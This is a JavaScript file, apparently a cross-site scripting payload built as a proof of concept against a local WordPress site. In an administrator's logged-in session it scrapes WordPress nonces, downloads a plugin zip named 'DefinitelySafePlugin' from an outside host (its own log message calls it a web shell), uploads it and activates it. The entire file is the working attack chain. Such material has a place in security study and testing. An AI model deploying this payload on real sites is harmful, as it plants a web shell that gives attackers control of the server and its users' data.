function addPlugin() {
    const pluginName = "DefinitelySafePlugin";

    // 1- fetch the plugin-installation wpnonce
    fetch("http://localhost:8000/wp-admin/plugin-install.php", {
        credentials: "include",
    })
    .then(res => res.text())
    .then(html => {
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');

        const nonceContainer = doc.querySelector("form.wp-upload-form[action*='upload-plugin'] input[type='hidden']#_wpnonce[name='_wpnonce']");
        const installation_wpNonce = nonceContainer?.getAttribute("value");

        if (!installation_wpNonce) {
            console.warn("Plugin addition nonce not found");
            return;
        }

        // 2 - install the plugin
        const zipUrl = `https://arian-lrd.github.io/public-resources/quiz-master-4.7.7/${pluginName}.zip`;
        //const zipUrl = `https://owasp.arianamiri.com/${pluginName}.zip`

        fetch(zipUrl)
        .then(r => r.blob())
        .then(zipBlob => {
            console.log(`Web Shell ${pluginName} retrieved successfully`);

            const form = new FormData();
            form.append('_wpnonce', installation_wpNonce);
            form.append('pluginzip', zipBlob, `${pluginName}.zip`);
            form.append('install-plugin-submit', 'Install Now');

            return fetch("http://localhost:8000/wp-admin/update.php?action=upload-plugin", {
                credentials: 'include',
                method: 'POST',
                body: form
            });
        })
        .then(() => {
            console.log(`${pluginName} was installed successfully`);

            // 3 - fetch the activation nonce
            return fetch("http://localhost:8000/wp-admin/plugins.php", {
                credentials: 'include'
            });
        })
        .then(res => res.text())
        .then(html => {
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');

            const nonceContainer = doc.querySelector(`tr[data-plugin='${pluginName}/${pluginName}.php'] td span a`);
            const activation_wpNonce = nonceContainer?.getAttribute("href").split('_wpnonce=')[1]?.substring(0, 10);

            if (!activation_wpNonce) {
                console.warn(`Activation nonce for ${pluginName} not found`);
                return;
            }

            // 4 - Activate the plugin
            return fetch(`http://localhost:8000/wp-admin/plugins.php?action=activate&plugin=${pluginName}%2F${pluginName}.php&_wpnonce=${activation_wpNonce}`, {
                credentials: 'include'
            });
        })
        .then(() => {
            console.log(`${pluginName} was activated successfully`);
        });
    });
}

addPlugin();

